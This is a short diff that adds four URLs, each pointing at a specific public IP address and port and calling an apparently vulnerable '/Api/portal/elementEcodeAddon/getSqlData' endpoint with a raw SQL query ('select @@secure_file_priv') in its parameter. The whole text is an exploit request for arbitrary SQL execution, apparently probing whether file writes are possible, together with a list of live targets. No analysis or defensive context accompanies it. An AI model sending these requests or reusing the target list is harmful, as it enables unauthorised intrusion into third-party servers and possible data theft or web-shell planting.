@@ -1,0 +1,4 @@
+http://123.60.83.196:8899/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@secure_file_priv
+http://119.3.210.103:8088/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@secure_file_priv
+http://117.73.3.10:8088/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@secure_file_priv
+http://123.235.29.70:8099/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@secure_file_priv
